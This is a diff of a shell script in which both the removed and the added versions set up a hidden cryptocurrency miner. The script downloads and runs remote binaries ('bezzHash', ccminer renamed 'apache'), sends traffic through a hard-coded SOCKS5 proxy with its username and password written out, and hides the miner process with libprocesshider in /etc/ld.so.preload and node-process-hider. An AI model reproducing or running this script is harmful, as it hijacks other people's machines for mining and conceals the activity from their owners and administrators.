@@ -1,20 +1,63 @@
 #!/bin/sh
 sleep 1m
-#!/bin/sh
-sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-sudo dpkg-reconfigure --frontend noninteractive tzdata
-sudo apt update
-sudo apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential nano git screen wget tor
-sudo service tor start
-git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
-cd ccminer;chmod +x build.sh;chmod +x configure.sh;chmod +x autogen.sh;./build.sh
-mv ccminer ../apache
-cd ..
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 
-git clone https://github.com/hanifgz/libprocesshider.git
-cd libprocesshider
+
+
+
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+ph add bezzHash
+sleep 9
+ph add bezzHash
+sleep 9
+ph add bezzHash
+sleep 9
+ph add bezzHash
+sleep 9
+ph add bezzHash
+sleep 30
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
 make
-sudo mv libprocesshider.so /usr/local/lib/;sudo su -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'
-cd ..
-
-./apache -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RKJZtNARyonv8N2GtPAo5E7sn8uHPjt2LZ.$(echo $(shuf -i 1-1000 -n 1)) -p x -t $(echo $(nproc --all)) --proxy socks5://127.0.0.1:9050
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+./graftcp/graftcp ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.kupool.com:443
